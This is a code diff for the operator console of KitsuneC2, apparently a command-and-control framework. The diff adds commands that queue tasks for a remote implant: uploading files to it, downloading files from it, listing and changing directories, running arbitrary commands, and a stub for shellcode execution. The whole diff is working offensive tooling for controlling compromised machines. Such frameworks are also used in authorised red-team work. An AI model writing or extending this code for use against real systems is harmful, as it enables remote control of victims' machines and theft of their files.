@@ -5,6 +5,7 @@ package cli
 
 import (
 	"KitsuneC2/lib/communication"
+	"KitsuneC2/lib/utils"
 	"KitsuneC2/server/api"
 	"bufio"
 	"bytes"
@@ -213,7 +214,8 @@ func interactPendingTasks(cCtx *cli.Context) error {
 	tbl.WithHeaderFormatter(headerFmt).WithFirstColumnFormatter(columnFmt)
 
 	for _, task := range tasks {
-		tbl.AddRow(task.Task_id, "TODO", string(task.Task_data))
+
+		tbl.AddRow(task.Task_id, communication.MessageTypeToModuleName[task.Task_type], string(task.Task_data))
 	}
 	tbl.Print()
 	return nil
@@ -231,7 +233,7 @@ func interactCompletedTasks(cCtx *cli.Context) error {
 	tbl.WithHeaderFormatter(headerFmt).WithFirstColumnFormatter(columnFmt)
 
 	for _, task := range tasks {
-		tbl.AddRow(task.Task_id, "TODO", string(task.Task_data))
+		tbl.AddRow(task.Task_id, communication.MessageTypeToModuleName[task.Task_type], string(task.Task_data))
 	}
 	tbl.Print()
 	return nil
@@ -297,7 +299,109 @@ func interactFileInfo(cCtx *cli.Context) error {
 	taskId, err := api.AddTaskForImplant(cliCtx.implantId, 11, &task)
 	if err != nil {
 		NotifyUser(err.Error(), "FAIL")
+		return nil
 	}
 	NotifyUser("created task with ID: "+taskId, "SUCCESS")
+	return nil
+}
+
+func interactUpload(cCtx *cli.Context) error {
+	origin := cCtx.String("origin")
+	destination := cCtx.String("destination")
+	if origin == "" || destination == "" {
+		NotifyUser("both [--origin] and [--destination] must be valid paths.", "FAIL")
+		return nil
+	}
+
+	fileContents, err := utils.ReadFile(origin)
+	if err != nil {
+		NotifyUser(err.Error(), "FAIL")
+		return nil
+	}
+
+	var task communication.Task = &communication.UploadReq{File: fileContents, Destination: destination}
+	taskId, err := api.AddTaskForImplant(cliCtx.implantId, 21, &task)
+	if err != nil {
+		NotifyUser(err.Error(), "FAIL")
+		return nil
+	}
+	NotifyUser("created task with ID: "+taskId, "SUCCESS")
+	return nil
+}
+
+func interactDownload(cCtx *cli.Context) error {
+	origin := cCtx.String("origin")
+	destination := cCtx.String("destination")
+	if origin == "" || destination == "" {
+		NotifyUser("both [--origin] and [--destination] must be valid paths.", "FAIL")
+		return nil
+	}
+
+	var task communication.Task = &communication.DownloadReq{Origin: origin, Destination: destination}
+	taskId, err := api.AddTaskForImplant(cliCtx.implantId, 19, &task)
+	if err != nil {
+		NotifyUser(err.Error(), "FAIL")
+		return nil
+	}
+	NotifyUser("created task with ID: "+taskId, "SUCCESS")
+	return nil
+}
+
+func interactLs(cCtx *cli.Context) error {
+	if cCtx.Args().Len() != 1 {
+		NotifyUser("ls: expected 1 argument", "FAIL")
+		return nil
+	}
+	path := cCtx.Args().First()
+
+	var task communication.Task = &communication.LsReq{Path: path}
+	taskId, err := api.AddTaskForImplant(cliCtx.implantId, 13, &task)
+	if err != nil {
+		NotifyUser(err.Error(), "FAIL")
+		return nil
+	}
+	NotifyUser("created task with ID: "+taskId, "SUCCESS")
+	return nil
+}
+
+func interactCd(cCtx *cli.Context) error {
+	if cCtx.Args().Len() != 1 {
+		NotifyUser("cd: expected 1 argument", "FAIL")
+		return nil
+	}
+	path := cCtx.Args().First()
+
+	var task communication.Task = &communication.CdReq{Path: path}
+	taskId, err := api.AddTaskForImplant(cliCtx.implantId, 17, &task)
+	if err != nil {
+		NotifyUser(err.Error(), "FAIL")
+		return nil
+	}
+	NotifyUser("created task with ID: "+taskId, "SUCCESS")
+	return nil
+}
+
+func interactExec(cCtx *cli.Context) error {
+	cmd := cCtx.String("cmd")
+	argsStr := cCtx.String("args")
+	if cmd == "" {
+		NotifyUser("[--cmd] is required", "FAIL")
+		return nil
+	}
+	args := strings.Split(argsStr, " ")
+
+	var task communication.Task = &communication.ExecReq{Cmd: cmd, Args: args}
+	taskId, err := api.AddTaskForImplant(cliCtx.implantId, 15, &task)
+	if err != nil {
+		NotifyUser(err.Error(), "FAIL")
+		return nil
+	}
+	NotifyUser("created task with ID: "+taskId, "SUCCESS")
+
+	return nil
+}
+
+func interactShellcodeExec(cCtx *cli.Context) error {
+	NotifyUser("Command not yet implemented", "FAIL")
 	return nil
 }
